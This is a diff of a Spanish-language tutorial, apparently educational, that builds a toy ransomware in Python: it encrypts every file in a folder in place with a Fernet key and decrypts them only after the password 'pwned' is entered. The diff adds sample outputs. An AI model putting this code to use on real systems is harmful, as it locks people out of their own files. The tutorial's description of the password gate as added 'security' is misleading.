@@ -68,7 +68,11 @@ key = Fernet.generate_key()
 print(key)
 ```
 
-**Salida:** Clave Fernet en bytes.
+**Salida (ejemplo):**
+
+```
+b'3vte2rpBKxpSz0b6beNYooa-WBT4cgjoCahYx8nIn1I='
+```
 
 **Qué se ha añadido:**
 
@@ -99,6 +103,14 @@ print(files)
 key = Fernet.generate_key()
 with open("thekey.key", "wb") as k:
     k.write(key)
+```
+
+**Salida:**
+
+```
+['saludo.txt', 'enfado.txt', 'pwned.txt', 'encrypt_v3.py']
+# ls
+encrypt_v3.py  enfado.txt  pwned.txt  saludo.txt  test  thekey.key
 ```
 
 **Qué se ha añadido:**
@@ -137,6 +149,16 @@ for file in files:
         f.write(contents_encrypted)
 ```
 
+**Salida (ejemplo):**
+
+```
+cat saludo.txt
+Hola que hase
+# después de cifrado
+cat saludo.txt
+gAAAAABozoY_2kVNYQRAEqHrbRwBkkdXFgHWtwSh7qYwMpWfSRs2bB4cKF2PPi13WwBaJ6XvlRs6tZYxQ7a5pZpgclIJpk0FMw==
+```
+
 **Descifrado (`decrypt.py`):**
 
 ```python
@@ -157,6 +179,13 @@ for file in files:
     contents_decrypted = Fernet(secretkey).decrypt(contents)
     with open(file, "wb") as f:
         f.write(contents_decrypted)
+```
+
+**Salida:**
+
+```
+cat saludo.txt
+Hola que hase
 ```
 
 **Qué se ha añadido:**
@@ -200,26 +229,26 @@ else:
     print("\n[!!!] Ese no es el pase secreto, lo siento.")
 ```
 
+**Salida:**
+
+```
+# contraseña incorrecta
+[+] Introduce el pase secreto para desencriptar tus archivos: probando
+[!!!] Ese no es el pase secreto, lo siento.
+# contraseña correcta
+[+] Introduce el pase secreto para desencriptar tus archivos: pwned
+[!] Enhorabuena tus archivos fueron descifrados
+cat pwned.txt
+Esto es como un ransomware
+```
+
 **Qué se ha añadido:**
 
-* Solicitud de contraseña al usuario antes del descifrado.
+* Solicitud de contraseña antes del descifrado.
 * Validación de la contraseña con un valor predefinido (`secretPass`).
 * Descifrado solo si la contraseña es correcta.
-* Mensajes de éxito o error según el caso.
 
 **Explicación:**
-Este script incrementa la seguridad añadiendo un control de acceso. Aunque los archivos estén cifrados, solo un usuario con la contraseña correcta puede recuperar su contenido.
-
----
-
-**Resumen:**
-
-1. Listado de archivos para procesar.
-2. Generación y almacenamiento de clave Fernet.
-3. Cifrado de archivos y sobrescritura.
-4. Descifrado seguro de archivos.
-5. Control de acceso mediante contraseña.
-
-El flujo puede extenderse con exclusión dinámica de archivos, manejo de errores, logging y otras buenas prácticas de seguridad.
+Se incrementa la seguridad del descifrado con un control de acceso adicional. Solo los usuarios que conocen la contraseña podrán recuperar el contenido de los archivos cifrados.
 
 ---
